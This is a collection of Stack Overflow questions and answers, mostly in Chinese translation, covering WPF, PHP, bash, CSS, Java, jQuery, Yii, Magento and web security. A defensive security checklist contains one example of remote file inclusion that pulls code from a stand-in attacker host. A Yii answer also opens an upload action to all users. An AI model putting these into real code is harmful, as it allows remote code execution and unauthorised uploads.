                <ContentControl Content="{Binding MixedTypeList[2]}" />
              </BlockUIContainer>
            </TableCell>
          </TableRow>
        </TableRowGroup>
      </Table.RowGroups>
    </Table>
  </FlowDocument>
</FlowDocumentScrollViewer> 
```

# windows-phone-7 - Windows phone 7x 以编程方式禁用蜂窝数据

> ID：14832513
> 
> 赞同：1
> 
> 时间：2013-02-12T12:25:00.773
> 
> 标签：windows-phone-7, windows-phone, windows-phone-7.8

是否可以从您的应用中禁用数据连接？我见过用于查询 wifi 和蜂窝状态的 api，但找不到关闭或打开它们的方法？谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-12T12:34:37.720

这是不可能的，我想永远不会

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-17T04:06:55.697

这不可能。作为 Windows Phone 设备的一般规则，出于安全和一致性原因，禁止任何会更改设备设置或应用程序之外的任何内容。

# php - 例如，使用 cookie 加速 Web 应用程序

> ID：14832514
> 
> 赞同：1
> 
> 时间：2013-02-12T12:25:01.097
> 
> 标签：php, jquery, mysql, caching, cookies

现在我使用此代码在我的网络应用程序中获取随机文本。

```
 $(document).ready(function() {
      $("#refresh").click(function(evt) {
         $("#content").load("load.php")
         evt.preventDefault();
      })
    }) 
```

Load.php 正在从数据库中加载随机文本。我能做些什么来加快这次会议吗？如果有人也知道如何在没有 3G 和 WiFi 的情况下使用 webb 应用程序，那就太好了。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-12T12:38:39.200

You can add to your php code a cache function.

When you load the random text, write it into `/cache/mytext.cache` and write an unix timestamp into `/cache/mytext.info`

Now, on top of your php script, read `/cache/mytext.info` and check if it's too old, if so, generate a new text and update the timestamp of mytext.info, else, load as text the content of /cache/mytext.cache

```
// Fetch the timestamp saved in /cache/mytext.info
$cachedate = file_get_contents('./cache/mytext.info', true);

// If timestamp + _× seconds_ is < of current time  
if(($cachedate + 3600) < time()) {

    // Fetch your new random text and store into $mytext
    // for example: $mytext = getrandomtext();

    // Write into /cache/mytext.cache your new random text
    $fp = fopen('./cache/mytext.cache', 'w');
    fwrite($fp, $mytext);
    fclose($fp);

    // Update timestamp written into /cache/mytext.info
    $fp = fopen('./cache/mytext.info', 'w');
    fwrite($fp, time());
    fclose($fp);

}

// Your random text is into $mytext
$mytext = file_get_contents('./cache/mytext.cache', true);

// Print it with echo
echo $mytext; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-12T13:00:23.630

Cache a single request in the browser and use jQuery's really useful, and much underused, Deferreds [http://api.jquery.com/category/deferred-object/](http://api.jquery.com/category/deferred-object/), of which an ajax call is an instance, to make sure it only gets loaded once the content has arrived

```
$(document).ready(function() {
  var nextContent = $.get('/load.php');//preload the result of the first random text request
  var clicked = false;

  $("#refresh").click(function(evt) {
     if (!clicked) { // prevent sending loads of requests if user reclicks impatiently
        clicked = true;

        nextContent.done(function (response) { 
          console.log('yay')
          $("#content").html(response); // print the text
          clicked = false;
          nextContent = $.get('/load.php'); //preload the next request
        })
     }
     evt.preventDefault();
  });
}) 
```

# bash - bash 命令求和并打印列的每个元素并打印新列

> ID：14832515
> 
> 赞同：4
> 
> 时间：2013-02-12T12:25:04.107
> 
> 标签：bash, sed, awk, bc

我应该使用哪个命令来对两个特定列的值求和？例如，我有文件：

```
1 4 5 1
2 3 5 2
7 8 6 3 
```

我想对第二列和最后一列求和，得到以下结果

```
1 4 5 1 5
2 3 5 2 5
7 8 6 3 11 
```

我应该使用 awk 和 bc 吗？我找到了很多例子来总结整个专栏......

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-02-12T12:33:38.343

尝试：

```
awk '{print $0, $2 + $NF }' input_file 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-02-12T12:42:05.967

由于您标记了问题`bash`（`awk`是最合适的工具！）

```
#!/bin/bash

while read -a ARRAY
do
    echo ${ARRAY[@]} $((${ARRAY[1]}+${ARRAY[3]}))
done < input.txt 
```

输出：

```
$ ./sum.sh 
1 4 5 1 5
2 3 5 2 5
7 8 6 3 11 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-12T12:32:08.360

这是完成您想要的命令：

```
awk '{$(NF+1)=$NF+$2}1' <filename 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-02-13T08:54:37.133

对于简单的计算`awk`是要走的路。在更复杂的情况下，您可能想要并行化操作，您可以使用 GNU 并行和您选择的计算器来执行此操作。

与`bash`：

```
<infile parallel --colsep ' +' echo '{}' '$(( {2} + {4} )) 
```

`bash`和`bc`：_

```
<infile parallel --colsep ' +' echo '{}' '$(bc <<< "{2} + {4}")' 
```

请注意，当前版本`parallel`没有一个简单的方法来引用输入的最后一个元素，但是，现在开发分支中有一个补丁允许对元素进行负索引，即您可以使用`{-1}`而不是`{4}`.

# jquery - 如何将背景图案图像应用于 html 工具提示箭头？

> ID：14832518
> 
> 赞同：0
> 
> 时间：2013-02-12T12:25:15.860
> 
> 标签：jquery, html, css

我正在为工具提示实现一个自定义 jquery 插件。当鼠标悬停在特定元素上时，此插件将显示一个工具提示框。我的工具提示块区域有一个指向基本元素的箭头。

我想将重复纹理图像应用于包括箭头在内的整个工具提示。我可以将图案图像分配给工具提示背景，但如何将其分配给箭头。

下图更说明了我的问题：

![在此处输入图像描述](../Images/b4414da29f5071fbb2bf6de07a020b07.png)

以下是箭头的代码：
HTML：

```
<div class="tooltip_outer">
  <div class="tooltip_arrow"></div>
  <div class="tooltip_txt">Tooltip content</div>
</div> 
```

CSS：

```
.tooltip_outer {
  position: absolute;
  z-index: 5;
  background: #000000 url(images/pattern.png);
  padding: 0;
  margin: 5px 3px;
  width: 135px;
  box-shadow: 0 0 10px #999;
}
.tooltip_arrow {
  top: -14px;
  position: absolute;
  border: 7px solid transparent;
  display: inline-block;
  border-width: 7px;
  border-bottom-color: #000000;
  left: 50%;
}
.tooltip_txt {
  margin: 10px;
  color: white;
} 
```

请指导我。提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2021-02-15T15:05:34.350

有点晚了，但希望它对有同样问题的人有用。

我使用 scss 和属性 clip-path 制作了一个 codepen，您可以在其中设置箭头的方向、位置和大小，以及边框的大小（如果需要）。

[https://codepen.io/onyphlax/pen/OJbpbGR](https://codepen.io/onyphlax/pen/OJbpbGR)

```
.tooltip {
  display: inline-block;
  padding: 4px;
  padding-bottom: calc(10px + 2px);
  background-color: fuchsia;
  position: relative;
  clip-path: polygon(0 0, 100% 0, 100% calc(100% - calc(10px + 2px)), calc(calc(50%) + calc(10px + 2px)) calc(100% - calc(10px + 2px)), calc(50%) 100%, calc(calc(50%) - calc(10px + 2px)) calc(100% - calc(10px + 2px)), 0 calc(100% - calc(10px + 2px)));
}
.tooltip__container {
  padding-bottom: 10px;
  margin-bottom: -6px;
  background-image: linear-gradient(to bottom right, cyan, purple);
  clip-path: polygon(0 0, 100% 0, 100% calc(100% - 10px), calc(50% + 10px) calc(100% - 10px), 50% 100%, calc(50% - 10px) calc(100% - 10px), 0 calc(100% - 10px));
}
.tooltip__content {
  padding: 1rem;
  color: white;
}
```

```
<div class="tooltip">
  <div class="tooltip__container">
    <div class="tooltip__content">I'm a tooltip</div>  
  </div>
</div>
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-12T12:29:31.857

使用 CSS，您不能将背景图像应用于边框。边框旨在作为边框，而不是形状。

您可以使用旋转 45 度的 DIV 作为箭头，但在旧浏览器上会出现问题。

编辑：我发现了一个新的 CSS3 属性，用于将图案图像添加到边框，我认为这就是您正在寻找的：

[http://www.vanseodesign.com/css/border-images/](http://www.vanseodesign.com/css/border-images/)

# java - 如何从 zip 文件中删除路径

> ID：14832522
> 
> 赞同：0
> 
> 时间：2013-02-12T12:25:41.107
> 
> 标签：java

我有一个包含路径的 zip 文件。当我解压缩文件并将其放入目标文件夹时，它会创建路径的文件夹。

```
public boolean doZip(String fileName, String zipfilename) {

    boolean zipStatus = true;

    try {
        String[] filesToZipP = new String[1];
        filesToZipP[0] = fileName;
        byte[] buffer = new byte[1000];
        ZipOutputStream out =
            new ZipOutputStream(new FileOutputStream(zipfilename));

        out.setLevel(Deflater.DEFAULT_COMPRESSION);

        for (int i = 0; i < filesToZipP.length; i++) {
            FileInputStream in = new FileInputStream(filesToZipP[i]);
            out.putNextEntry(new ZipEntry(filesToZipP[i]));

            int len;
            while ((len = in.read(buffer)) > 0) {
                out.write(buffer, 0, len);
            }
            out.closeEntry();
            in.close();
        }
        out.close();
    }
    catch (IllegalArgumentException e) {
        zipStatus = false;

    }
    return zipStatus;
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-12T12:40:43.433

为此，我只需使用我自己的路径和文件名。

```
fis = new FileInputStream(dirList[i])
ZipEntry anEntry = new ZipEntry(rootName + "/" + dirList[i].name)
zos.putNextEntry(anEntry) 
```

如果您的 zip 文件不包含任何文件夹，则使用 rootName = ""。基本上，您的路径必须相对于 zip 文件的根目录。我希望你明白我的意思。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-12T12:40:46.613

```
 String name = new File(filesToZipP[i]).getName();
   out.putNextEntry(new ZipEntry(name)); 
```

# java - 条件与对象等待/通知

> ID：14832526
> 
> 赞同：3
> 
> 时间：2013-02-12T12:25:45.500
> 
> 标签：java, multithreading, concurrency

我正在阅读有关`Condition`对象以及它们如何为每个对象提供多个等待集以及区分哪些对象或对象/线程组获得特定信号的信息。
为什么普通人`Object`不这样做？例如

代替：

```
final Condition notFull  = lock.newCondition();   
final Condition notEmpty = lock.newCondition();     

lock.lock();  
try {  
  while (count == items.length)  
     notFull.await();  
  items[putptr] = x;  
  if (++putptr == items.length) putptr = 0;  
      ++count;  
   notEmpty.signal(); 
```

我们这样做：

```
final Object notFull  = new Object();     
final Object notEmpty = new Object();       

lock.lock();  
try {  
  while (count == items.length)  
     notFull.wait();  
  items[putptr] = x;  
  if (++putptr == items.length) putptr = 0;  
      ++count;  
   notEmpty.notify(); 
```

我们不是还有多个等待集并区分通知的线程吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-12T12:40:21.690

在您的示例中，您在一个锁上创建了 2 个条件。这是内置同步无法做到的——你必须使用 2 个对象来获得 2 个条件。

你的第二个代码被破坏了，因为你没有锁定 notFull 和 notEmpty 而是调用 wait / notify - 你会得到 IllegalMonitorStateException。但是，如果您尝试将它们都锁定，您会发现您无法同时执行此操作。这就是区别

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-12T12:33:43.813

您需要`synchronize`先调用`wait`或`notify`。当您需要两个不同的集合时，您需要两个对象来同步。嵌套同步会给你死锁。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-12T12:34:28.500

这不好。您必须拥有对象的监视器才能使用其`notFull.wait()`方法。即使它被允许它仍然不会 release `lock`，所以没有其他线程可以访问它。

# android - Is it possible to still interact with Fragments on the back-stack?

> ID：14832528
> 
> 赞同：0
> 
> 时间：2013-02-12T12:25:56.497
> 
> 标签：android, android-fragments

Referring to the Fragment documentation, specifically [Performing Fragment Transactions](http://developer.android.com/guide/components/fragments.html#Transactions) it states:

> Whereas, if you do call addToBackStack() when removing a fragment, then the fragment is **stopped** and will be resumed if the user navigates back.

I want to understand the implications of a Frgament being stopped because I am creating several Fragments which I would like to place on the BackStack yet must still interact with them from an external (i.e. non-GUI) thread, to set a flag within the Fragment for example. Also if the Fragment starts threads within it, are they too stopped or 'suspended' once the Fragment is placed onto the backstack?

# tfs - 在 TFS 2012 中创建新工作项时，以下图标是什么意思？

> ID：14832532
> 
> 赞同：0
> 
> 时间：2013-02-12T12:26:08.463
> 
> 标签：tfs, visual-studio-2012, tfs-workitem

下图是西班牙语，但这没关系。

该菜单显示 TFS 上的工作项列表，并在我单击“创建新工作项”时打开。我不知道不同图标的含义以及为什么前两个工作项类型有不同的图标。

我创建了您可以在那里看到的所有工作项，但我不知道在它们上做任何不同的事情可以设置不同的图标或菜单上的不同位置。

![在此处输入图像描述](../Images/84ae272cd3e750b5e2d8c89eba81cb17.png)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-12T20:43:09.800

这些图标表示这些特定工​​作项类型所在的类别。例如，带有复选标记的剪贴板对应于任务类别中的工作项类型，其下方带有聊天框和感叹号的剪贴板表示工作项属于需求类别的类型。这些类别在创建团队项目时在流程模板中定义，也可以导出/编辑/导入到任何当前项目。希望这可以帮助 ：）

这是关于自定义类别的 MSDN 链接：http: [//msdn.microsoft.com/en-us/library/vstudio/dd273721.aspx](http://msdn.microsoft.com/en-us/library/vstudio/dd273721.aspx)

# jquery - 如何将提交事件添加到动态生成的表单？

> ID：14832534
> 
> 赞同：0
> 
> 时间：2013-02-12T12:26:08.857
> 
> 标签：jquery

这是生成表单的 PHP 代码：form.php

```
 <?php
    echo '
    <form action="/wall/comment.php" method="post" id="submit-comment-form" name="'.$postid.'"> 
    <div class="write-comment-profile-pic">
    <img src= "'.$myprofilepic.'" width="30" height="30""/>
    </div>
    <div class="write-comment-textbox-wrap">
    <input type="text" class="textbox4" id="write-comment-textbox" value="Write a comment..." name="comment" style="width:65%;" />
    </div>
   </form>
   ';
   ?> 
```

获取 form.php 的 Jquery 代码

```
$('#images img').click(function() { 
$.get('form.php', function(data) {
$('#image-pop-up').html(data);
});
}); 
```

并且这里是需要提交表单的 jquery 代码：

```
$('#image-pop-up').on('submit', '#submit-comment-form', function() { 
evt.preventDefault();       
}); 
```

在 index.html image-pop-up div 中只是一个空的

`<div id="image-pop-up">`

```
</div> 
```

这不起作用......怎么了？如何解决？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-02-12T12:43:52.507

我怀疑问题与选择器有关，目标元素要么没有找到，要么是正确的目标元素。

一些可能出错的事情：

1.  双重 ID 引用是不必要的：这只是另一个可能出错的地方。
2.  如果`#image-pop-up`执行此代码时尚未生成，则永远不会绑定该事件。
3.  该`submit`事件仅在表单上触发，因此您需要确保这是您的目标。
4.  您调用`preventDefault()`of `evt`，但未`evt`绑定到 events 参数。

假设这`#submit-comment-form`是您正在处理的表单，无论执行时是否有任何元素可用，以下代码都应该工作：

```
$(document).on('submit', '#submit-comment-form', function(evt){
    evt.preventDefault();
}) 
```

# upload - eajaxupload in yii failes

> ID：14832543
> 
> 赞同：0
> 
> 时间：2013-02-12T12:26:30.193
> 
> 标签：upload, yii-extensions

I try ti user eajaxupload extention in yii(using this article: [http://www.yiiframework.com/extension/eajaxupload](http://www.yiiframework.com/extension/eajaxupload)

I want Upload and attache image to one of controller, I try this code: **in controller:** **(my controller name is : article)**

```
public function actionUpload()
        {
    Yii::import("ext.EAjaxUpload.qqFileUploader");

        $folder= Yii::app()->baseUrl .'/uploads';// folder for uploaded files
        $allowedExtensions = array("jpg");//array("jpg","jpeg","gif","exe","mov" and etc...
        $sizeLimit = 10 * 1024 * 1024;// maximum file size in bytes

        $uploader = new qqFileUploader($allowedExtensions, $sizeLimit);
        $result = $uploader->handleUpload($folder);
        $result=htmlspecialchars(json_encode($result), ENT_NOQUOTES);

    $fileSize=filesize($folder.$result['filename']);//GETTING FILE SIZE
        $fileName=$result['filename'];//GETTING FILE NAME

        //echo $result;// it's array
    } 
```

and in _form.php (for controller) i have:

```
$this->widget('ext.EAjaxUpload.EAjaxUpload',
        array(
            'id'=>'uploadFile',
                'config'=>array(
                    'action'=>'/article/upload',
                    'allowedExtensions'=>array("jpg"),//array("jpg","jpeg","gif","exe","mov" and etc...
                    'sizeLimit'=>10*1024*1024,// maximum file size in bytes
                    //'minSizeLimit'=>10*1024*1024,// minimum file size in bytes
                    //'onComplete'=>"js:function(id, fileName, responseJSON){ alert(fileName); }",

                    'showMessage'=>"js:function(message){ alert(message); }"
                    )
)); ?> 
```

upload folder have full access for all!, but when i push upload file and select a file always get error: filename, filesize and **Faild!**

What is wrong in my code?

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-09T00:49:05.593

添加此内容时，您在控制台上看到了什么

```
echo "<pre>";
print_r($result);
echo "</pre>";exit(0); 
```

在 $result=htmlspecialchars(json_encode($result), ENT_NOQUOTES) 之后；

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-05-09T22:34:18.667

确保您的上传文件夹存在。Yii::app()->baseUrl 返回 '...yourproject/protected'。

我用：`$folder=Yii::app() -> getBasePath() . "/../images/";`

还要在浏览器中检查您的控制台（按 F12）。如果您收到 403 错误，则将规则添加到您的控制器以进行上传操作

```
 public function accessRules()
    {
    return array(
        array('allow',  // allow all users to perform 'index' and 'view' actions
            'actions'=>array('index','view','upload'),
            'users'=>array('*'),
        ), 
     ..... 
```

# magento - Product category name on product viewing page

> ID：14832544
> 
> 赞同：0
> 
> 时间：2013-02-12T12:26:31.643
> 
> 标签：magento, magento-1.7

I'm working on a [website](http://toolskaart.com). Upon clicking the product it shows all the details of it. But my client want me to show parent category of categroy of the product at top, above the image. Please help me about it. I'm a budding developer.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-17T13:10:20.807

试试这个可能会帮助别人。

```
<?php $_helper = $this->helper('catalog/output');?>
<?php $_category_detail=Mage::registry('current_category');?>
<?php $_category_detail->getName();?>
<?php $_category_detail->getId(); ?> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-12T12:39:59.787

您可以从您的产品对象中获取类别数据：`$_product->getCategory()->getName();`. 您必须在 中编辑模板`template/catalog/product/view.phtml`。在模板文件中查找 `<div class="product-img-box">`并添加：

```
 <div class="product-img-box">
            <h4><?php echo $_product->getCategory()->getName(); ?></h4>
            <?php echo $this->getChildHtml('media') ?>
        </div> 
```

# android - How to open sd card by button click and show in main menu selected file

> ID：14832549
> 
> 赞同：1
> 
> 时间：2013-02-12T12:26:43.770
> 
> 标签：android

How to open and pick file by click load button? I want to show a sd card location when I click on load button and pick any file from there and display on main screen selected files.

Can anyone help me on how to show selected files from SD card display on screen?

```
Button loadButton = (Button) findViewById(R.id.loadButton);
loadButton.setOnClickListener(new OnClickListener() {
    public void onClick(View v) {

    }
}); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-12T12:39:11.553

您需要开始活动在 Manifasto.xml 文件中添加以下代码

```
<activity
            android:name=".fileDialog"
            android:configChanges="orientation"
            android:screenOrientation="reverseLandscape" /> 
```

在你的java中你需要添加方法

```
public void onButtonClick(View v) {
        pathSelect = "/sdcard/";
        Intent myIntent = new Intent(getBaseContext(),
                fileDialog.class);
        myIntent.putExtra(fileDialog.START_PATH,
                pathSelect);
    startActivityForResult(pathSelect, REQUEST_SAVE);       
    }

public synchronized void onActivityResult(final int requestCode,
            int resultCode, final Intent data) {
        String filename = "null";
        if (resultCode == Activity.RESULT_OK) {
            filename = data.getStringExtra(FileDialog.RESULT_PATH);         
        } else if (resultCode == Activity.RESULT_CANCELED) {
// do on cancle button click
                            }
} 
```

# windows-8 - 在 Windows 商店应用程序中播放的 PowerPoint 演示文稿

> ID：14832550
> 
> 赞同：1
> 
> 时间：2013-02-12T12:26:45.873
> 
> 标签：windows-8, windows-runtime, powerpoint, windows-store-apps, office-interop

我需要在 Windows 商店应用程序中播放作为资产嵌入的 PowerPoint 演示文稿。我下载了 Visual Studio Tools for Visual Studio 2012 并尝试使用老式的 Microsoft.Office.Interop.PowerPoint 包，但我偶然发现了以下错误：

> 由于以下错误，使用 CoCreateInstanceFromApp 创建具有 CLSID {91493441-5A91-11CF-8700-00AA0060263B} 的 COM 组件实例失败：80040154 未注册类（HRESULT 异常：0x80040154 (REGDB_E_CLASSNOTREG)）。请确保您的 COM 对象在 CoCreateInstanceFromApp 的允许列表中

因此，windows store 应用程序似乎无法调用这些类型的 COM 对象。 [http://msdn.microsoft.com/en-us/library/windows/apps/br205757.aspx](http://msdn.microsoft.com/en-us/library/windows/apps/br205757.aspx)

是否有任何 API 可用于 Windows 商店应用程序来显示 pptx？

谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-12T13:37:38.907

不，目前没有用于在 Windows 应用商店应用程序中显示 pptx 的 API。

一些解决方法可能是：

*   从您的应用程序启动 PowerPoint 中的 pptx（在您的 Windows 应用商店应用程序之外）。以下是[如何启动文件的默认应用程序](http://msdn.microsoft.com/en-us/library/windows/apps/hh452687.aspx)（PowerPoint 是 .pptx 的默认应用程序）。
*   将 pptx 幻灯片转换为图像（如果这是您正在展示的静态 PowerPoint 幻灯片，请提前进行转换，或者如果您需要支持接收和显示新的 PowerPoint 幻灯片，请调用可以执行此操作的 Web 服务）

# vb.net - 在水晶报表中显示图像

> ID：14832554
> 
> 赞同：2
> 
> 时间：2013-02-12T12:26:49.627
> 
> 标签：vb.net, crystal-reports, datatable, dataset, barcode

我想在 VB.net 中使用水晶报表来显示包含条形码的图像。但是当我运行应用程序时，我在加载报表之前得到以下异常，尽管我已将 crdb_adoplus.dll 的引用添加到我的项目中。

**异常：无法加载文件或程序集 'crdb_adoplus, Version=9.1.3300.0, Culture=neutral, PublicKeyToken=692fbea5521e1304' 或其依赖项之一。强名称验证失败。（来自 HRESULT 的异常：0x8013141A）**

这是我的代码：

```
Private Sub Frm_Reporting_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        CrystalReportViewer1.ReportSource = Nothing
        Dim rptbarcode As RptPacking
        rptbarcode = New RptPacking
        Dim xrep As DataSet1
        xrep = New DataSet1
        Dim row As DataRow
        Dim MyImg As Image = Nothing
        Try
            btnEncode(MyImg, BarcodeText)
            row = xrep.Tables("DataTable1").NewRow
            Dim ms As New MemoryStream()

            MyImg.Save(ms, System.Drawing.Imaging.ImageFormat.Jpeg)

            Dim ii As Byte()

            ii = ms.ToArray()

            xrep.Tables("DataTable1").Rows.Add(ii)

            rptbarcode.Load("GSMProduction.RptPacking.rpt")
            rptbarcode.SetDataSource(xrep.Tables("DataTable1"))
            CrystalReportViewer1.ReportSource = rptbarcode

        Catch ex As Exception
            MessageBox.Show(ex.Message)
        End Try
    End Sub

    Private Sub btnEncode(ByRef pic As Image, ByVal txtData As String)
        Dim W As Integer = 160
        Dim H As Integer = 110
        Dim b As BarcodeLib.Barcode
        Dim type As BarcodeLib.TYPE = BarcodeLib.TYPE.UNSPECIFIED
        type = BarcodeLib.TYPE.CODE128
        b = New BarcodeLib.Barcode()
        Try
            If type <> BarcodeLib.TYPE.UNSPECIFIED Then
                b.IncludeLabel = True

                '===== Encoding performed here ===== 
                pic = b.Encode(type, txtData, W, H)
                'CType(Frm, frm_submitentery).pic_img.Image = pic.Image
                '=================================== 

            End If

        Catch ex As Exception
            'try 
            MessageBox.Show(ex.Message)
            'catch 
        End Try

    End Sub 
```

我非常感谢您提前提出的建议。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T05:32:07.547

如果您在 VS2010 中运行 .Net 4，那么您可能需要将以下内容添加到您的 .config 文件（配置部分）中：

```
<startup useLegacyV2RuntimeActivationPolicy="true">
  <supportedRuntime version="v4.0" sku=".NETFramework,Version=v4.0"/>
</startup> 
```

# google-maps-api-2 - 带有谷歌地图 api 的信息窗口

> ID：14832557
> 
> 赞同：0
> 
> 时间：2013-02-12T12:26:56.397
> 
> 标签：google-maps-api-2, infowindow

如何在我的地图上显示两个信息窗口。

在我的代码中，我只能打开一个 InfoWindow，但我会在我的地图上同时显示两个 InfoWindow 我能做什么。我的代码是：

```
function load() {

    if (GBrowserIsCompatible()) {

        var map = new GMap2(document.getElementById("map"));
        map.setCenter(new GLatLng( 38.736946, 35.310059), 6);

        map.openInfoWindow(new GLatLng( 38.582526,  42.846680),
        document.createTextNode("Van Gölü"));
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-12T13:56:42.513

[Google Maps API v2](https://developers.google.com/maps/documentation/javascript/v2/reference)本机 InfoWindow 仅支持每个地图一个。[Google Maps API v3](https://developers.google.com/maps/documentation/javascript/basics)消除了这一限制。

使用自定义 InfoWindow 或将您的应用程序迁移到 Google Maps API v3。

正如@duncan 所观察到的，Google Maps API v2 已于 2010 年 5 月 19 日正式弃用，并且在 2013 年 5 月 19 日之后将不再受支持。强烈建议不要在该 API 中进行新开发。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T10:36:08.643

此代码有效：

```
<!DOCTYPE html>
<html>
  <head>
    <META http-equiv=content-type content=text/html;charset=x-mac-turkish>
    <style type="text/css">
      html { height: 100% }
      body { height: 100%; margin: 0; padding: 0 }
      #map_canvas { height: 100% }
    </style>
 <script src="js/jquery.js"></script>
    <script type="text/javascript"
      src="https://maps.googleapis.com/maps/api/js?key=mykey&sensor=false">
    </script>
    <script type="text/javascript">
      var map;
function initialize() {
        var mapOptions = {
          center: new google.maps.LatLng(39.078908,35.244141),
          zoom: 6,
          mapTypeId: google.maps.MapTypeId.ROADMAP
        };
            map = new google.maps.Map(document.getElementById("map_canvas"),
            mapOptions);
    infoWindow = new google.maps.InfoWindow();
        var windowLatLng = new google.maps.LatLng(38.668356,33.376465);
        infoWindow.setOptions({
        content: "Tuz Golu",
        position: windowLatLng,
    });
    infoWindow.open(map); 

      infoWindow2 = new google.maps.InfoWindow();
        var windowLatLng2 = new google.maps.LatLng(38.565348,42.868652);
        infoWindow2.setOptions({
        content: "Van Golu",
        position: windowLatLng2,
    });
    infoWindow2.open(map);
}
</script>
  </head>
  <body onload="initialize()">
  <div id="map_canvas" style="width:65%; height:40%"></div>
</body>
</html> 
```

# jquery - Moving elements?

> ID：14832565
> 
> 赞同：-2
> 
> 时间：2013-02-12T12:27:31.957
> 
> 标签：jquery

Is there a way to do something like [**here**](http://www.joeys.de/) the moving ingredients of pizza in jquery for example or somehow?

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-12T12:31:46.040

您应该清楚地解释您的问题（-1）。虽然你可以做这样的事情：

```
#tomato{ position: absolute; top: 100px; left: 100px;}
$("#tomato").animate({ left: "+=20" }, 5000); 
```

您也可以使用 CSS3： [https ://developer.mozilla.org/en-US/docs/CSS/transform](https://developer.mozilla.org/en-US/docs/CSS/transform) [http://jsfiddle.net/nSa9s/2/](http://jsfiddle.net/nSa9s/2/)

# android - Design Suggestion, Tabhost, fragment, or anything else

> ID：14832566
> 
> 赞同：1
> 
> 时间：2013-02-12T12:27:34.530
> 
> 标签：android, android-fragments, android-actionbar, android-tabhost

I have to implement the design something like this, and data will be changed on right and left section only not on top.

[a busy cat http://androgems.x10.mx/Images/Untitled.png](http://androgems.x10.mx/Images/Untitled.png)

There is a pattern, On top portion selection --> only right screen will be changed, and On right portion selection --> only left portion will be changed.

How should I achieve this? any suggestion pls. I want to achieve it by no transition effects like in tabhost. thanks in advance.

# php - How much web security knowledge do I need before I can publish my site?

> ID：14832569
> 
> 赞同：0
> 
> 时间：2013-02-12T12:27:46.660
> 
> 标签：php, mysql, security, sql-injection

I'm coding my first php/mysql site and realize that I know very little about security beyond what I learned in my course/book. How much security knowledge do I need before I can publish my own site without being concerned that achieving even modest success will draw hackers and lead to my site being broken into?

If it helps with more specifics, I'm creating a site that will allow users to add plain text content, as well as browse what others have added. The text is meant to be stored in a db.

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-12T13:05:41.310

你不可能知道一切，所以这取决于你的代码有哪些可能的攻击媒介以及风险是什么。

**问你自己：**

*   **我是否根据用户输入包含或读取文件？**那么你应该知道为什么白名单很重要以及流包装器的风险是什么（即`include 'http://evil.example.com/hack.txt';`）。请参阅：[PHP - “包含”功能是否安全？](https://stackoverflow.com/questions/10148328/php-is-include-function-secured/10148413#10148413)
*   **我是输出用户生成的内容还是基于用户输入的内容？**那你应该知道什么是[XSS](http://en.wikipedia.org/wiki/XSS)（Cross Site Scripting）以及如何防止它
*   **我是否使用动态 SQL 查询？**然后你应该知道什么是[SQL 注入](http://en.wikipedia.org/wiki/SQL_injection)以及如何防止它们。旁注：不要再使用这些`mysql_`功能了。请参阅：[不推荐使用 mysql 扩展并将在将来删除：请改用 mysqli 或 PDO](https://stackoverflow.com/questions/13944956/the-mysql-extension-is-deprecated-and-will-be-removed-in-the-future-use-mysqli)
*   **我使用会话吗？**那么你应该知道什么是[Session Hijacking](http://en.wikipedia.org/wiki/Session_hijacking)以及如何防止它。
*   **我是否使用文件上传？**那么您应该了解如何[保护文件上传](http://www.net-security.org/dl/articles/php-file-upload.pdf)（PDF 链接）
*   **我是否处理用户密码？**那么您应该了解最先进的密码散列技术，即 bcrypt。请参阅：[如何在 PHP 中使用 bcrypt 对密码进行哈希处理？](https://stackoverflow.com/questions/4795385/how-do-you-use-bcrypt-for-hashing-passwords-in-php)
*   **我是否使用特定于用户的表单？**那么你应该了解[CSRF](http://en.wikipedia.org/wiki/CSRF)（Cross Site Request Forgery）以及如何防止它
*   **我是否使用发送邮件的表单？**然后您应该了解[电子邮件注入](http://en.wikipedia.org/wiki/Email_injection)或使用您知道对其进行保护的库，例如[swiftmailer](http://swiftmailer.org/docs/headers.html)。
*   **我是否使用任何形式？**然后不要`PHP_SELF`作为它的动作，因为[XSS 也是对 $_SERVER 变量的一种可能的攻击](https://stackoverflow.com/a/13248255/664108)。

*此列表不完整，但应涵盖简单 Web 应用程序的最常见用例及其安全威胁*

**关于风险：**

一旦您处理了用户的敏感个人数据或将网站托管在您自己的虚拟服务器上，您就有额外的责任，因为最坏的情况不再只是您的网站可能被破坏，而是私人数据可能会暴露，您的服务器可能会发生变化变成垃圾邮件机器人或更糟。

最重要的规则是：**不要相信任何传入的数据**

